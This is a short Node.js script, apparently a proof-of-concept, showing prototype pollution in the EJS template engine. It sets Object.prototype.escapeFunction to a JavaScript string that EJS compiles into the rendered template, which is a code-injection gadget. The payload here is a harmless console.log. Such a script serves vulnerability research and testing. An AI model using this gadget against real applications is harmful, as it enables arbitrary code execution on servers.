const ejs = require('ejs');

const obj = {};
const data = {
    user: {name: 'hey'},
    name: 'flub'
};

// obj['__proto__']['localsName'] = 'user';
// obj['__proto__']['localsName'] = '+';

obj['__proto__']['escapeFunction'] = 'function (param) {console.log("whut")}'

const str = '<% if (user) { %>\n' +
    '  <h2><%= user.name %></h2>\n' +
    '<% } %>'

ejs.render(str, data, {client: true})

// console.log(ejs.compile(str, {
//     client: true
// })(data));